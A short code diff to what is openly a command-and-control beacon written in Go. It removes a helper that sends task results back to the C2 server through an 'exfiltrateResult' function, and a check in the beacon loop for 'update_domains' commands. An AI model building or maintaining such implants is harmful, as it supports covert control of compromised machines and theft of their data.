@@ -819,11 +819,6 @@ func (b *Beacon) handleListVars() string {
 	return strings.TrimRight(sb.String(), "\n")
 }
 
-// sendResult sends a task result back to the C2
-func (b *Beacon) sendResult(taskID, result string) error {
-	return b.exfiltrateResult(result, taskID) // Fix: parameters were reversed
-}
-
 // runBeacon starts the beacon loop
 func (b *Beacon) runBeacon() {
 	b.running.Store(true)
@@ -1019,12 +1014,6 @@ func (b *Beacon) runBeacon() {
 			}()
 
 			// Task already marked as executed before execution (pre-execution dedup above)
-
-			// If update_domains was processed, the closure returned early
-			// Continue to next cycle
-			if strings.HasPrefix(command, "update_domains:") {
-				continue
-			}
 		}
 	}
 }
